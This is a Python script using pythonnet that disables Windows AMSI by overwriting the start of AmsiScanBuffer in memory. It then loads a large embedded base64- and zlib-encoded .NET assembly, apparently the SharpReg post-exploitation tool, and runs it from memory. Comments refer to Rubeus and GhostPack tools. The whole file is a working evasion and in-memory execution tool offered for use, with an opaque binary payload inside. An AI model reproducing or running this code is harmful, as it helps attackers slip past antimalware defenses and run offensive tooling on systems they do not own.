import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpReg.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()